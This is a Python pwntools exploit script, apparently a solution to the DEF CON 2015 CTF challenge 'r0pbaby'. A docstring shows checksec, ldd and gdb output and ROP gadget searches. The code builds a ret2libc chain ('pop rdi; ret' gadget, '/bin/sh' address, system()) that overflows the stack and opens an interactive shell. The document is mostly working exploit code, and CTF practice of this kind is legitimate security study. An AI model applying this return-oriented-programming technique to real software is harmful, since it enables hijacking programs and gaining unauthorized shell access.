# coding: UTF-8

from pwn import *
from struct import pack, unpack


'''
$ checksec.sh  --file r0pbaby 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   r0pbaby

 $ ./r0pbaby  
Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007F7FBAA6A9B0 ?????????!!!!!!!!!!!!!!!!!!

$ ldd ./r0pbaby 
	linux-vdso.so.1 =>  (0x00007ffffa3fe000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffdc953e000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffdc9178000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffdc9968000)

(gdb) i proc map
process 3823
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555556000     0x2000        0x0 /media/sf_CTF/defcon2015/babys_first/r0pbaby-1/r0pbaby
      0x555555755000     0x555555757000     0x2000     0x1000 /media/sf_CTF/defcon2015/babys_first/r0pbaby-1/r0pbaby
      0x555555757000     0x555555778000    0x21000        0x0 [heap]
      0x7ffff7810000     0x7ffff79cb000   0x1bb000        0x0 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff79cb000     0x7ffff7bcb000   0x200000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7bcb000     0x7ffff7bcf000     0x4000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7bcf000     0x7ffff7bd1000     0x2000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.19.so

(gdb) x/s 0x7ffff7810000
0x7ffff7810000: "\177ELF\002\001\001"


$ rp --file=/lib/x86_64-linux-gnu/libc.so.6 --rop=1 | grep 'pop rdi ; ret'| less
0x00022a0a: pop rdi ; ret  ;  (1 found) # doesn't work
0x00022a21: pop rdi ; ret  ;  (1 found)
0x00022a4a: pop rdi ; ret  ;  (1 found)
0x00022a72: pop rdi ; ret  ;  (1 found)
'''

r = process('./r0pbaby')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = 0x7ffff7810000
libc_system_offset = libc.symbols['system']
libc_system = libc_base + libc_system_offset

binsh_offset = next(libc.search('/bin/sh\0'))
binsh_addr = libc_base + binsh_offset

rdi_gadget_offset = 0x00022a4a
rdi_gadget_addr = libc_base + rdi_gadget_offset

print 'system offset: {0}'.format(hex(libc_system_offset))
print 'libc system:   {0}'.format(hex(libc_system))
print 'binsh offset:  {0}'.format(hex(next(libc.search('/bin/sh\0'))))
print 'binsh addr:    {0}'.format(hex(binsh_addr))

r.send("3\n")
print 3
msg = r.recvuntil("Enter bytes to send (max 1024): ")
print msg

payload = 'a'*8 # rbp overwrite
payload += p64(rdi_gadget_addr)
payload += p64(binsh_addr)
payload += p64(libc_system)

payload_length = str(len(payload))
r.send(payload_length + "\n")
print payload_length
r.send(payload + "\n")
print payload

msg = r.recvuntil("Bad choice.\n")
print msg

r.interactive()
